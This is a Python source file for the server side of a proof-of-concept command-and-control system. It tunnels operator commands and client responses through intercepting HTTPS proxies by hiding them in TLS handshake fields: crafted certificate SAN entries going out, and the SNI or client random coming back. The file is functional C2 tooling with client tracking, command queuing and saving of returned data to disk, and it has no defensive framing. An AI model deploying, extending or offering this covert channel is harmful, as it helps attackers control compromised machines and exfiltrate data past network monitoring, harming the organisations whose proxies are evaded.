# -*- coding: utf-8 -*-

"""
server.py

PoC To Smuggle Messages through an intercepting HTTPS proxy using only the TLS Handshake.

Client Max Bytes Per TLS Client Hello: 284 / 2 ( /2 because of encoding)
Server Max Bytes Per TLS Server Hello: 16k - TLS overhead [~15k] / 2 ( /2 because of encoding)
Server Max Length of SAN record: 

NOTE: See protocol.py comments and client.py comments for PROTOCOL details
 
"""

# cryptography imports - warning: compiled C libs lurk here
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa

# pkg name is 'tlslite-ng' - A native python TLS implementation, not to be confused with 'tlslite' :/
from tlslite.x509certchain import X509, X509CertChain
from tlslite.utils.keyfactory import parsePEMKey
from tlslite.extensions import SNIExtension
from tlslite.errors import TLSAbruptCloseError
from tlslite.sessioncache import SessionCache

#
# NOTE: Forked Version of tlslite.tlsconnection that allows us to Dynamically create TLS Server Hello Messages on the fly
#
from tlsconnection import TLSConnection
from protocol import *

import socketserver
import struct

from datetime import datetime, timedelta
import typing
import random
import string
import threading
import socket
import sys
import argparse
import queue
import os
import time
import math

import http.server

#
# Globals
#

MAX_SINGLE_MSG_LEN = 254  # max len of a single SAN entry
MAX_TOTAL_MSG_LEN = MAX_SINGLE_MSG_LEN * 62  # You can have up to 16k bytes total in a SAN record ~(roughly)
# These for a random HOST/TLD generators
MAX_TLD_LEN = 4
MAX_HOST_LEN = 8
MAX_DOMAIN_LEN = 6
MAX_CLIENT_AGE = 60  # Mark a client disconnected if it does not check in for this number of seconds
VERBOSE = True  # Show some additional output
MAX_CONSOLE_MSG_LEN = 120  # only print this number of chars
NS_TO_MS = 1000000

# This Mixin is not that exciting since... ALL we are doing is handshaking TLS
class TLSSocketServerMixIn:
    def finish_request(self, sock, *args):
        try:
            tlslite_connector = TLSConnection(sock, C2Server.callback)
            if self.handshake(tlslite_connector) == True:
                tlslite_connector.close()
        except Exception as e:
            # We wrap this in a try block because drive-by scanners, crawlers will trip this all day
            # print(str(e.args))
            print("[!] Exception occured while handling of TLS Connection in TLSSocketServerMixIn()")
            raise e


class Client:
    def __init__(
        self, connected_ts=int(datetime.now().timestamp()), last_poll_ts=0, unique_id="0", src="0.0.0.0:0", mode="seed"
    ) -> None:
        self.mode = mode  # how we smuggle, "sni" || "seed"
        self.mss = 0  # Maximum Segment Size (max byte per message)
        self.connected_ts = connected_ts
        self.last_poll_ts = last_poll_ts
        self.is_connected = False
        self.pending_cmd = []
        self.last_cmd = ""
        self.last_san_msg = ""
        self.cmd_count = 0
        self.fragments = {}
        # TODO: unique id should be used to uniquely identify a client - need to implement this in the client
        self.unique_id = unique_id
        self.src = src
        # TODO: Implement more cool data elements, like OS type/version, and other sweet telemetry gathered...
        # This should be a pretty substantial list of things....
        self.stats = {
            "total_rtt_ms": 0,
            "packet_count": 0,
            "packets_per_sec": 0,
            "bytes_per_sec": 0,
            "total_xfer_time": 0,
            "first_fragment_ts": 0,
        }
        try:
            os.makedirs("files")
        except FileExistsError:
            pass

    def __str__(self):
        return str(vars(self))


#
# Our C2 Server Class
#
class TLSServer(socketserver.ThreadingMixIn, TLSSocketServerMixIn, http.server.HTTPServer):
    """Our TLS Server... with a few MixIns"""

    CLIENT_DICT = {}  # Our list of Clients (contains client_id's as bytes objects)
    MSG_LIST = []  # Use to print messages to the console when 'things happen'

    def insert_partial(self, client_id: bytes, data: str):
        previous = self.data.get(client_id)
        if previous:
            self.data[client_id] += [data]
        else:
            self.data[client_id] = [data]

    def delete_old_client_id(self, client_id: bytes) -> str:
        try:
            value = "".join(self.data[client_id])
            del self.data[client_id]
        except KeyError:
            value = ""
        return value

    def callback(
        self, sni_object: SNIExtension, protocol_headers: bytes, sock: socket.socket
    ) -> typing.Tuple[X509CertChain, bytes]:
        """The tlslite.tlsconnection module calls this function before responding with a ServerHello"""
        # What kind of request is this?
        client_msg = Message()
        # Check if this is a returning client
        is_existing_client = False
        client_msg.set(protocol_headers)
        use_sni = False
        client_msg_type = client_msg.get_msg_type(protocol_headers)
        reply_msg_headers = Message()
        server_reply_payload = b""
        if VERBOSE:
            self._print_verbose(client_msg, sni_object, protocol_headers, sock)
        if client_msg_type == ClientMessage.TEST or client_msg_type == ClientMessage.CONNECT:
            # Test out client connectivity - Dont actually do C2 things
            results = self._print_test_results(client_msg, sni_object, protocol_headers, sock)
            reply_msg_headers = Message()
            msg_type = None
            if client_msg_type == ClientMessage.TEST:
                msg_type = ServerMessage.TEST
            else:
                msg_type = ServerMessage.ACK
            reply_msg_headers.header = client_msg.get_client_id(protocol_headers) + msg_type
            server_reply_payload = (
                reply_msg_headers.hex().encode()
                + b"_C2CRET_,"
                + str(results[0]).encode()
                + b","
                + str(results[1]).encode()
            )
            use_sni = results[1]
        if client_msg_type == ClientMessage.TEST:
            self.set_cert(server_reply_payload)
            self._print_verbose_response(server_reply_payload)
            return (X509CertChain([self.KEYSTORE.public.tlslite]), self._get_random_seed())
        # end if TEST or CONNECT
        client_id = client_msg.get_client_id(protocol_headers)
        if client_id in self.CLIENT_DICT.keys():
            is_existing_client = True
        # Do other things based on the Message Type
        if client_msg_type == ClientMessage.CONNECT:
            # Setup a new nession
            # TODO: Make client sessions persist!
            # Which means a client will hash some machine specific attribute and write it to file, etc
            if not is_existing_client:
                # generate a client id and insert into our list
                # client_id = bytes([random.randrange(0, 256) for _ in range(0, 2)])
                self.CLIENT_DICT[client_id] = Client()
                self.CLIENT_DICT[client_id].last_poll_ts = int(datetime.now().timestamp())
                self.CLIENT_DICT[client_id].src = sock.getpeername()[0] + ":" + str(sock.getpeername()[1])
                self.CLIENT_DICT[client_id].is_connected = True
                if use_sni:
                    self.CLIENT_DICT[client_id].mss = CLIENT_MAX_SNI_SIZE
                    self.CLIENT_DICT[client_id].mode = "sni"
                else:
                    self.CLIENT_DICT[client_id].mss = CLIENT_MAX_SEED_SIZE
                    self.CLIENT_DICT[client_id].mode = "seed"
                self._append_log_message(
                    f"New client '{client_id.hex()}' connected from {self.CLIENT_DICT[client_id].src} Mode: {self.CLIENT_DICT[client_id].mode}, MSS: {self.CLIENT_DICT[client_id].mss} bytes"
                )
                self.set_cert(server_reply_payload)
                self._print_verbose_response(server_reply_payload)
                return (X509CertChain([self.KEYSTORE.public.tlslite]), self._get_random_seed())
            else:
                # This is a returning client
                self.CLIENT_DICT[client_id].last_poll_ts = int(datetime.now().timestamp())
                reply_msg_headers.header = client_id + ServerMessage.ACK
        if not is_existing_client:
            server_reply_payload = reply_msg_headers.hex().encode() + server_reply_payload
            self.set_cert(server_reply_payload)
            self._print_verbose_response(server_reply_payload)
            return (X509CertChain([self.KEYSTORE.public.tlslite]), self._get_random_seed())
        if client_msg_type == ClientMessage.POLL:
            cmd_msg = b""
            # we got a POLL from an existing client (a heartbeat)
            self.CLIENT_DICT[client_id].last_poll_ts = int(datetime.now().timestamp())
            # See if we have any pending CMD's to send to this client
            if self.CLIENT_DICT[client_id].pending_cmd:
                reply_msg_headers.header = client_id + ServerMessage.CMD_AVAILABLE
                cmd_msg = self.CLIENT_DICT[client_id].pending_cmd.pop().encode()
                self.CLIENT_DICT[client_id].last_cmd = cmd_msg
                self.CLIENT_DICT[client_id].cmd_count += 1
                server_reply_payload = cmd_msg
                self.CLIENT_DICT[client_id].stats["total_rtt_ms"] = int(time.time_ns() / NS_TO_MS)
            else:
                reply_msg_headers.header = client_id + ServerMessage.ACK
        if client_msg_type == ClientMessage.FRAGMENT:
            mesg_decoded_bytes = b""
            # print(f"!! DEBUG: in fragment")
            if self.CLIENT_DICT[client_id].mode == "sni":
                try:
                    mesg_decoded_bytes = self._decode_msg(sni_object.hostNames[0])
                    # print(f"!! DEBUG: decoded sni: {mesg_decoded_bytes}")
                except:
                    mesg_decoded_bytes = b"__ERROR_SERVER_FAILED_TO_DECODE_SNI!"
            else:
                # print(f"!! DEBUG: in else seed block")
                mesg_decoded_bytes = client_msg.get_payload(protocol_headers)
                # print(f"!! DEBUG: passing these bytes to assemble_response: {mesg_decoded_bytes}")
            reply_msg_type = self._assemble_response(client_id, protocol_headers, mesg_decoded_bytes)
            reply_msg_headers.header = client_id + reply_msg_type
            reply_msg_headers.body = client_msg.body
            if self.CLIENT_DICT[client_id].stats["first_fragment_ts"] == 0:
                self.CLIENT_DICT[client_id].stats["first_fragment_ts"] = int(time.time_ns() / NS_TO_MS)
        if client_msg_type == ClientMessage.RESPONSE:
            # Lets ensure that we have a fully assembled message from the client!
            total_segments = struct.unpack(">L", (client_msg.get_total_segments(protocol_headers)))[0]
            payload_list = list(dict(sorted(self.CLIENT_DICT[client_id].fragments.items())).values())
            if total_segments != len(payload_list):
                self._append_log_message(
                    f"Error: Client '{client_id.hex()}' sent {len(payload_list)} fragments, but we were expecting {total_segments}!"
                )
                reply_msg_headers.header = client_id + ServerMessage.ABORT
            else:
                reply_msg_headers.header = client_id + ServerMessage.ACK
                response_bytes = b"".join(payload_list)
                self.CLIENT_DICT[client_id].stats["total_rtt_ms"] = (
                    int(time.time_ns() / NS_TO_MS) - self.CLIENT_DICT[client_id].stats["first_fragment_ts"]
                )
                self.CLIENT_DICT[client_id].stats["packet_count"] = len(self.CLIENT_DICT[client_id].fragments)
                total_xfer_time = self.CLIENT_DICT[client_id].stats["total_rtt_ms"]
                self.CLIENT_DICT[client_id].stats["payload_bytes"] = len(response_bytes)
                self.CLIENT_DICT[client_id].stats["total_xfer_time"] = total_xfer_time
                self.CLIENT_DICT[client_id].stats["bytes_per_sec"] = round(
                    (len(response_bytes) / ((self.CLIENT_DICT[client_id].stats["total_rtt_ms"]) / 1000)), 2
                )
                self.CLIENT_DICT[client_id].stats["packets_per_sec"] = round(
                    (
                        len(self.CLIENT_DICT[client_id].fragments)
                        / ((self.CLIENT_DICT[client_id].stats["total_rtt_ms"]) / 1000)
                    ),
                    2,
                )
                self._append_log_message(self._record_client_msg(client_id, response_bytes))
                # Reset client stats
                self.CLIENT_DICT[client_id].stats["total_rtt_ms"] = int(time.time_ns() / NS_TO_MS)
                self.CLIENT_DICT[client_id].stats["first_fragment_ts"] = 0
                # clear our fragments buffer
                self.CLIENT_DICT[client_id].fragments = {}
        # update existing clients' status
        self.CLIENT_DICT[client_id].last_poll_ts = int(datetime.now().timestamp())
        self.CLIENT_DICT[client_id].is_connected = True
        # if VERBOSE:
        #     self._append_log_message(
        #         f"SEND > [[ {len(cmd_msg)} bytes; client_id: {client_id.hex()}; msg_type={reply_msg_type.hex()}; decoded_san= ` {cmd_msg.decode()[:50]} ` ]]"
        #     )
        server_reply_payload = reply_msg_headers.hex().encode() + server_reply_payload
        self.set_cert(server_reply_payload)
        self._print_verbose_response(server_reply_payload)
        return (X509CertChain([self.KEYSTORE.public.tlslite]), self._get_random_seed())

    def _record_client_msg(self, client_id: bytes, response_bytes: bytes) -> str:
        cfile = self.CLIENT_DICT[client_id].last_cmd.decode().replace(" ", "_").replace("/", ".").replace("\\", ",")
        cfile = str(self.CLIENT_DICT[client_id].cmd_count) + "_" + cfile
        cpath = "files/" + client_id.hex() + "/" + cfile
        # try to interpret payload as a string
        response_str = ""
        try:
            response_str = response_bytes.decode().rstrip()
        except:
            response_str = "[!] Could not decode bytes as string!"
        try:
            os.makedirs("files/" + client_id.hex())
        except FileExistsError:
            pass
        with open(cpath, "wb") as fh:
            fh.write(response_bytes)
        ellipsis = ""
        if len(response_str) > MAX_CONSOLE_MSG_LEN:
            ellipsis = "..."
        return f"Client '{client_id.hex()}' Response: {response_str[:MAX_CONSOLE_MSG_LEN]+ellipsis} [{len(response_bytes)} bytes written to '{cpath}'] | Stats: {self.CLIENT_DICT[client_id].stats}"

    # We include this KEYSTORE object in the callback because we're being invoked from the tlslite-ng lib
    KEYSTORE = type(
        "keystore",
        (object,),
        dict(
            private=type("keystore", (object,), dict(x509=None, pem=None, tlslite=None)),
            public=type("keystore", (object,), dict(x509=None, pem=None, tlslite=None)),
            _default_pub=type("keystore", (object,), dict(x509=None, pem=None, tlslite=None)),
        ),
    )
    session_cache = None

    @staticmethod
    def _is_response_or_fragment(protocol_headers: bytes) -> bool:
        m = Message()
        result = False
        if m.get_msg_type(protocol_headers) == ClientMessage.FRAGMENT:
            result = True
        if m.get_msg_type(protocol_headers) == ClientMessage.RESPONSE:
            result = True
        return result

    def _append_log_message(self, message: str) -> None:
        self.MSG_LIST.append(f">>> {time.ctime()}: {message}")

    def send_command(self, cmd: str) -> None:
        # TODO: For now, all connected clients get sent the command. Need to build out to target specific clients
        for k, v in self.CLIENT_DICT.items():
            self.CLIENT_DICT[k].pending_cmd.append(cmd)

    def _assemble_response(self, client_id: bytes, protocol_headers: bytes, fragment: bytes) -> bytes:
        """Adds a data fragment to the clients record until all is read
        Returns false if a retransmission is nessesary, in the case of CRC failure, etc
        """
        # TODO: Make this receive OUT OF SEQUENCE fragments in order to accomodate a multi-threaded client
        m = Message()
        seq_num = struct.unpack(">L", (m.get_sequence_num(protocol_headers)))[0]
        crc = struct.unpack(">L", (m.get_crc(protocol_headers)))[0]
        # enforce some size limitations (for now)
        # if payload_len > MAX_FILE_SIZE:
        #     return False
        # Ensure that our sequence number is what we expect
        # TODO: makes fragments a DICT
        mss = CLIENT_MAX_SNI_SIZE
        if self.CLIENT_DICT[client_id].mode == "seed":
            mss = CLIENT_MAX_SEED_SIZE
        if seq_num < 0 or seq_num > int((MAX_FILE_SIZE / (mss / 2))):
            return ServerMessage.ABORT
        # computer our crc
        if m.compute_crc(fragment) != crc:
            if VERBOSE:
                print(f"FRAGMENT ERROR: {m.compute_crc(fragment)} != {crc} on '{fragment.hex()}'")
            return ServerMessage.CRC_ERROR
        # everthing looks good
        self.CLIENT_DICT[client_id].fragments[seq_num] = fragment
        return ServerMessage.ACK

    def set_cert(self, sni_msg_bytes: bytes) -> None:
        """This sets the current Keystore to the crafted x509 certificate we wanna send"""
        self.KEYSTORE.public.x509 = self.create_message(sni_msg_bytes, encode=True)
        self.KEYSTORE.public.pem = self.KEYSTORE.public.x509.public_bytes(encoding=serialization.Encoding.PEM).decode()
        tlslite_cert = X509()
        self.KEYSTORE.public.tlslite = tlslite_cert.parse(self.KEYSTORE.public.pem)

    def _parse_headers(client_random: bytes) -> Message:
        """Take a bytes object and turn it into a C2 Message instance"""
        h = Message()
        h.header = h.get_client_id(client_random) + h.get_msg_type(client_random)
        h.body = h.get_total_segments(client_random) + h.get_sequence_num(client_random) + h.get_crc(client_random)
        return h

    def init(self):
        """Its just easier to name this as such and call explicitly,
        rather than having to fight the mixins dunder inits.. wouldn't you agree?"""
        self.session_cache = SessionCache()
        self.KEYSTORE.private.x509 = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
            backend=default_backend(),
        )
        self.KEYSTORE.private.pem = self.KEYSTORE.private.x509.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.TraditionalOpenSSL,
            encryption_algorithm=serialization.NoEncryption(),
        ).decode()
        self.KEYSTORE.private.tlslite = parsePEMKey(
            self.KEYSTORE.private.pem,
            private=True,
        )
        tlslite_cert = X509()
        self.KEYSTORE._default_pub.x509 = self.create_default_cert("localhost")
        self.KEYSTORE._default_pub.pem = self.KEYSTORE._default_pub.x509.public_bytes(
            encoding=serialization.Encoding.PEM
        ).decode()
        self.KEYSTORE._default_pub.tlslite = tlslite_cert.parse(self.KEYSTORE._default_pub.pem)
        self.KEYSTORE.public.x509 = self.KEYSTORE._default_pub.x509
        self.KEYSTORE.public.pem = self.KEYSTORE._default_pub.pem
        self.KEYSTORE.public.tlslite = self.KEYSTORE._default_pub.tlslite
        self.KEYSTORE.public._san_message_str = ""
        # super.__init__(self, *args)

    def handshake(self, tlslite_connector):
        try:
            tlslite_connector.handshakeServer(
                certChain=X509CertChain([self.KEYSTORE._default_pub.tlslite]),
                privateKey=self.KEYSTORE.private.tlslite,
                sessionCache=self.session_cache,
            )
            tlslite_connector.ignoreAbruptClose = True
            return True
        except TLSAbruptCloseError:
            pass
        except Exception as e:
            raise e

    def create_message(self, message: bytes, encode=True) -> x509.Certificate:
        # Based on: https://gist.github.com/bloodearnest/9017111a313777b9cce5
        san_msg_str = message.decode()
        if encode:
            host, domain, tld = self._get_random_hostname()
            fqdn = domain + "." + tld
            name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, fqdn)])
            san_msg_str = self._str_to_hex(message.decode()) + "." + fqdn
        else:
            name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, san_msg_str)])
        if len(san_msg_str) > MAX_SINGLE_MSG_LEN:
            print(
                f"ERROR: Encoded message length of {len(san_msg_str)} exceeds MAX_SINGLE_MSG_LEN of {MAX_SINGLE_MSG_LEN}"
            )
            raise NotImplementedError
        self.KEYSTORE.public._san_message_str = san_msg_str
        # Our smuggled payload goes into the SAN
        san = x509.SubjectAlternativeName([x509.DNSName(san_msg_str)])
        # Now ready to create the crafter Certificate...
        basic_constraints = x509.BasicConstraints(ca=True, path_length=0)
        create_ts = datetime.utcnow() - timedelta(seconds=random.randint(86400, 2592000))
        cert = (
            x509.CertificateBuilder()
            .subject_name(name)
            .issuer_name(name)
            .public_key(self.KEYSTORE.private.x509.public_key())
            .serial_number(1000)
            .not_valid_before(create_ts)
            .not_valid_after(datetime.utcnow() + timedelta(days=random.randint(1, 30)))
            .add_extension(basic_constraints, False)
            .add_extension(san, False)
            .sign(self.KEYSTORE.private.x509, hashes.SHA256(), default_backend())
        )
        # cert_pem = cert.public_bytes(encoding=serialization.Encoding.PEM)
        self.current_cert = cert
        return cert

    @staticmethod
    def _get_random_tld():
        return "." + "".join(random.choice(string.ascii_lowercase) for i in range(random.randint(2, MAX_TLD_LEN)))

    @staticmethod
    def _get_random_seed() -> bytes:
        return bytes([random.randrange(0, 256) for _ in range(0, 32)])

    def create_default_cert(self, cn: str) -> x509.Certificate:
        if not cn:
            cn = ".".join(self._get_random_hostname())
        create_ts = datetime.utcnow() - timedelta(seconds=random.randint(86400, 2592000))
        cert = (
            x509.CertificateBuilder()
            .subject_name(x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, cn)]))
            .issuer_name(x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, cn)]))
            .public_key(self.KEYSTORE.private.x509.public_key())
            .serial_number(1000)
            .not_valid_before(create_ts)
            .not_valid_after(datetime.utcnow() + timedelta(days=random.randint(1, 30)))
            .add_extension(x509.BasicConstraints(ca=True, path_length=0), False)
            .add_extension(x509.SubjectAlternativeName([x509.DNSName(cn)]), False)
            .sign(self.KEYSTORE.private.x509, hashes.SHA256(), default_backend())
        )
        self.default_cert = cert
        return cert

    @staticmethod
    def _get_random_hostname() -> typing.Tuple[str, str, str]:
        tld = "".join(random.choice(string.ascii_lowercase) for i in range(random.randint(2, MAX_TLD_LEN)))
        domain = "".join(random.choice(string.ascii_lowercase) for i in range(random.randint(3, MAX_DOMAIN_LEN)))
        host = "".join(random.choice(string.ascii_lowercase) for i in range(random.randint(4, MAX_HOST_LEN)))
        return host, domain, tld

    @staticmethod
    def _str_to_hex(message: str) -> str:
        return bytes.hex(message.encode())

    def _get_sni(self, hex_str: str) -> str:
        # 2 + 32 + session_id_len[1 byte] + suites_len[2 bytes]
        # 1 + ciphers_len[2 bytes] {ciphers}
        # comp_len[1 byte] {comps}
        # ext_len[2 bytes]
        # EXT_TYPE[2 bytes]; if type == 00 00 == SNI
        # EXT_LEN[2 bytes]
        # offset = 66 + int()
        #
        hex_array = [hex_str[i : i + 2] for i in range(0, len(hex_str), 2)]  # byte array (well, list but ya know)
        position = 35 + int(hex_array[35], 16)  # fixed tls fields
        position = position + int("".join(hex_array[position : position + 2]), 16) + 2  # ciphers suites
        position = position + int(hex_array[position], 16) + 1  # compression methods
        # extensions_len = int("".join(h[position : position + 2]), 16)
        position = position + 2
        sni = self._find_sni_extension(hex_array[position:])
        return sni

    @staticmethod
    def _find_sni_extension(exts: list) -> str:
        position = 0
        while position < len(exts):
            ext_type = "".join(exts[position : position + 2])
            ext_len = int("".join(exts[position + 2 : position + 4]), 16)
            # print("DEBUG_EXT_len: "+str(ext_len))
            # print("DEBUG_type: "+ext_type)
            if ext_type == "0000":
                position = position + 7
                # print("DEBUG_position: "+str(position))
                sni_len = int("".join(exts[position : position + 2]), 16)
                position = position + 2
                # print("DEBUG_sni_len: "+str(sni_len))
                # print("DEBUG_sni!: "+str(''.join(exts[position:position+sni_len])))
                return bytes.fromhex("".join(exts[position : position + sni_len])).decode()
            else:
                position = position + ext_len + 4
            return ""

    @staticmethod
    def _validate_client_hello(hex_str: str) -> bool:
        # TLS client hello HEADER Ex: "16 0301 00d3 01 000024"
        try:
            if hex_str[0:2] != "16":
                return False
            if hex_str[2:4] != "03":
                return False
            if (int(hex_str[4:6], 16) < 1) or (int(hex_str[4:6], 16) > 4):
                return False
            max_len = int(math.pow(2, 14))
            if (int(hex_str[6:10], 16) < 1) or (int(hex_str[6:10], 16) > max_len):
                return False
            if hex_str[10:12] != "01":
                return False
            if (int(hex_str[12:], 16) < 1) or (int(hex_str[12:], 16) > max_len):
                return False
        except:
            return False
        return True

    def _print_test_results(
        self, client_msg: Message, sni_object: SNIExtension, protocol_headers: bytes, sock: socket.socket
    ) -> typing.Tuple[bool, bool]:
        m = Message()
        header_str = ""
        try:
            header_str = m.get_payload(protocol_headers).decode()
        except:
            pass
        sni_bytes = b""
        sni_bytes_decoded = b""
        try:
            sni_bytes = sni_object.hostNames[0]
            if VERBOSE:
                print(f"<   Raw SNI: {sni_bytes.decode()}")
        except:
            if VERBOSE:
                print(f"<   ERROR: NO SNI PRESENT!")
        try:
            sni_bytes_decoded = self._decode_msg(sni_bytes).decode()
            if VERBOSE:
                print(f"<      Decoded SNI bytes: {sni_bytes_decoded}")
        except:
            pass
        if VERBOSE:
            print()
        sni_success = False
        rnd_success = False
        if header_str == "_C2CRET_":
            if VERBOSE:
                print("[+] Random Seed Smuggling PASSED!")
            rnd_success = True
        else:
            if VERBOSE:
                print("[!] Random Seed Smuggling FAILED")
        if sni_bytes_decoded == "_C2CRET_":
            if VERBOSE:
                print("[+] SNI Smuggling PASSED!")
            sni_success = True
        else:
            if VERBOSE:
                print("[!] SNI Smuggling FAILED")
        if VERBOSE:
            print("Test complete.")
        return (rnd_success, sni_success)

    def _print_verbose(
        self, client_msg: Message, sni_object: SNIExtension, protocol_headers: bytes, sock: socket.socket
    ) -> None:
        print()
        print(f"< CONNECTION FROM: {sock.getpeername()[0] + ':' + str(sock.getpeername()[1])}")
        print(f"<   Raw Protocol Headers: {self._to_hex_x_notation(protocol_headers)}")
        print(f"<      cid: {self._to_hex_x_notation(client_msg.get_client_id(protocol_headers))}")
        print(f"<      type: {ClientMessage().type_to_text(client_msg.get_msg_type(protocol_headers))}")
        try:
            payload_len = struct.unpack(">L", (client_msg.get_total_segments(protocol_headers)))[0]
        except:
            payload_len = -1
        print(f"<      len: {payload_len}")
        header_str = ""
        try:
            header_str = bytes.fromhex(client_msg.get_payload(protocol_headers).decode()).decode()
            print(f"<      payload: {header_str}")
        except:
            print(f"<      payload: '{self._to_hex_x_notation(client_msg.get_payload(protocol_headers))}'")
        sni_bytes = b""
        sni_bytes_decoded = b""
        try:
            sni_bytes = sni_object.hostNames[0]
            print(f"<   Raw SNI: {sni_bytes.decode()}")
        except:
            print(f"<   ERROR: NO SNI PRESENT!")
        try:
            sni_bytes_decoded = self._decode_msg(sni_bytes).decode()
            print(f"<      Decoded SNI bytes: {sni_bytes_decoded}")
        except:
            pass
        print()

    def _print_verbose_response(self, response_bytes: bytes) -> None:
        # print(f"!! DEBUG: {response_bytes}")
        m = Message()
        headers = bytes.fromhex(response_bytes[:64].decode())
        body = response_bytes[64:]
        m.set(headers)
        print()
        print(f">   Raw Response Headers: {self._to_hex_x_notation(headers)}")
        print(f">      cid: {self._to_hex_x_notation(m.get_client_id(headers))}")
        print(f">      type: {ServerMessage().type_to_text(m.get_msg_type(headers))}")
        print(f">   Raw Response Body: {body}")
        print(f">  Encoded SAN Message: {self.KEYSTORE.public._san_message_str}")
        print()

    @staticmethod
    def _decode_msg(msg: bytes) -> bytes:
        """Extracts the smuggled SNI message from the Client Hello"""
        return bytes.fromhex("".join(msg.decode().split(".")[:-1]))

    @staticmethod
    def _to_hex_x_notation(bs: bytes) -> str:
        return "".join(["\\x%02x" % i for i in bs])


# end class C2Server()


def _watch_msg_list(c2_instance: TLSServer, prompt: str) -> None:
    while True:
        is_last_line = False
        if c2_instance.MSG_LIST:
            print()
            print(c2_instance.MSG_LIST.pop())
        if is_last_line:
            sys.stdout.write(prompt)
            sys.stdout.flush()
            is_last_line = False
        # Police our connected client list. Mark stale ones down
        for k, v in c2_instance.CLIENT_DICT.items():
            if v.is_connected:
                if (v.last_poll_ts + MAX_CLIENT_AGE) < int(datetime.now().timestamp()):
                    c2_instance.CLIENT_DICT[k].is_connected = False
        time.sleep(1)


if __name__ == "__main__":
    # sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # proxy_send("_HOST_",443)

    # is_connected = proxy_connect
    # send_raw.proxy_connect(socket.socket(socket.AF_INET, socket.SOCK_STREAM),'_HOST_')

    # new shiz
    arg_parse = argparse.ArgumentParser(
        description="Send and Receive messages via TLS Handshakes through an interception proxy"
    )
    arg_parse.add_argument(
        "-p",
        "--port",
        metavar="bind_port",
        required=False,
        help="Bind to Listening TCP Port number",
    )
    args = arg_parse.parse_args()
    port = 8443
    if args.port:
        port = int(args.port)
    server = None
    C2Server = TLSServer(("0.0.0.0", port), None)
    C2Server.init()
    C2Server.allow_reuse_address = True
    C2Server.allow_reuse_port = True
    server_thread = threading.Thread(target=C2Server.serve_forever, daemon=True)
    # Now for console (curses) awesomeness...
    prompt = "c2server >>> "
    # We also want a thread to watch our Message Queue for printing things to console
    console_msg_thread = threading.Thread(target=_watch_msg_list, args=[C2Server, prompt], daemon=True)
    #
    # TODO: our console msg thread is still fcked up. It's not updating the screen!! FIX THIS
    #
    console_msg_thread.start()
    print(f"[+] Listening on 0.0.0.0:{port}")
    print("Type 'help' for more information. To terminate the process, type 'exit' or Ctrl-C")
    try:
        server_thread.start()
        while True:
            # get input from console
            cmd = input(prompt)
            # handle any cmd's from the console
            if cmd.startswith("cmd"):
                C2Server.send_command(" ".join(cmd.split(" ")[1:]))
            if cmd.startswith("list"):
                for k, v in C2Server.CLIENT_DICT.items():
                    print(f"{k.hex()}: {v}")
            if cmd == "help":
                print("NOT IMPLEMENTED YET!")
            if cmd == "exit":
                break
            # TODO: Add more commands here!
            # Ex. list clients, etc :)
        raise KeyboardInterrupt
    except KeyboardInterrupt:
        # console_msg_thread.join() # this will die of natural causes
        C2Server.shutdown()
        C2Server.server_close()
        server_thread.join()
        print("[+] Exiting.")
        exit(0)
